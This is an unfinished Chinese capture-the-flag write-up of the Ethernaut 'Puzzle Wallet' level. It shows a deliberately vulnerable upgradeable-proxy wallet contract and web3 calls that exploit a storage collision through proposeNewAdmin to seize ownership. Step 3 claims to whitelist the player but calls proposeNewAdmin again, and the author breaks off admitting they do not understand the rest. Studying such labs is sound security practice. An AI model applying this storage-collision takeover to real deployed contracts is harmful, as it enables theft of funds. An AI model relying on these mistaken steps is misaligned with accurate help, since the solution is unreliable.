### 第二十四题 Puzzle Wallet
### 题目
劫持这个钱包，去成为代理的管理员
### 提示
- 了解委托调用的工作原理以及执行调用时 msg.sender 和 msg.value 的行为方式。
- 了解代理模式及其处理存储变量的方式。
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;
// 导入可升级代理合约
import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    // 待定管理员地址
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }
    // 仅允许管理员调用的修饰符
    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }
    //提议新的管理员
    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }
     // 批准新的管理员，仅管理员可调用
    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }
    // 升级到新的实现合约，仅管理员可调用
    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    //白名单
    mapping(address => bool) public whitelisted;
    //账户余额
    mapping(address => uint256) public balances;
    // 初始化函数，设置最大余额和所有者地址
    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }
     // 仅允许白名单地址调用的修饰符
    modifier onlyWhitelisted() {
        // 检查调用者是否在白名单中
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }
    // 设置最大余额，仅白名单地址可调用
    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }
     // 添加地址到白名单，仅所有者可调用
    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }
    // 存款函数，仅白名单地址可调用
    function deposit() external payable onlyWhitelisted {
        // 确保存款后余额不超过最大余额
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }
    // 执行交易函数，仅白名单地址可调用
    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }
    // 多重调用函数，仅白名单地址可调用
    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;// 标记是否调用过存款函数
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            //assembly：这是一个内联汇编块，用于直接操作EVM（以太坊虚拟机）中的数据。
            //mload(add(_data, 32))：mload 是一个内联汇编指令，用于从内存中加载数据。add(_data, 32) 计算 _data 的偏移量，加上32字节（因为前32字节是数据长度），从而指向实际的数据部分。最终，这行代码从 _data 的第32字节开始加载数据，即提取函数选择器。
            assembly {
                selector := mload(add(_data, 32))
            }
            //检查提取的函数选择器是否等于 deposit 函数的选择器。
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```
### 解题思路&过程
1. approveNewAdmin有onlyAdmin限制,addToWhitelist又要求msg.sender必须等于owner,唯一可以调用的函数是proposeNewAdmin提议新的管理员 ，pendingAdmin存储在solt0中，如果PuzzleWallet使用delegatecall调用proposeNewAdmin，由于delegatecall的特性，它实际上修改的是owner，于是就可以控制第二个合约。
2. 具体方法如下
``functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [{type: 'address',name: '_newAdmin'}]
    }
params = [player]
data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
await web3.eth.sendTransaction({from: player, to: instance, data})
//检查一下owner
await contract.owner()==player``
3. 通过上述调用我们已经成为PuzzleWallet合约的owner，下一步是添加自己的地址进whitelisted
``await contract.proposeNewAdmin(player)``
4. 检查是否是第一次调用deposit函数
``if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;``
            }
5. 没看懂.......
